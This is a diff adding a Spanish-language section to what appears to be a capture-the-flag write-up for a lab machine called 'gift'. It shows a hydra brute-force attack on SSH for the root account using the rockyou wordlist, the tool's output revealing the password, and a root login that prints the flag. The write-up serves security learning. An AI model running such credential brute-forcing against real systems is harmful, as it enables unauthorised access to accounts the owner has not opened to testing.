@@ -69,3 +69,54 @@ Network Distance: 1 hop
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
 ```
+
+---
+
+## Prueba propia para resolución
+
+Ataque de fuerza bruta a ssh
+
+Comando:
+
+``` bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.56.103:22
+```
+
+Salida:
+
+``` java
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-16 17:48:20
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.56.103:22/
+[22][ssh] host: 192.168.56.103   login: root   password: simple
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-16 17:48:29
+```
+
+La contraseña es "simple" con lo que podemos conectarnos a root por ssh:
+
+``` bash
+ssh root@192.168.56.103
+
+The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
+ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.103' (ED25519) to the list of known hosts.
+root@192.168.56.103's password: 
+
+IM AN SSH SERVER
+
+gift:~# ls
+root.txt  user.txt
+
+gift:~# cat root.txt
+HMVtyr543FG
+```
+
+---
+
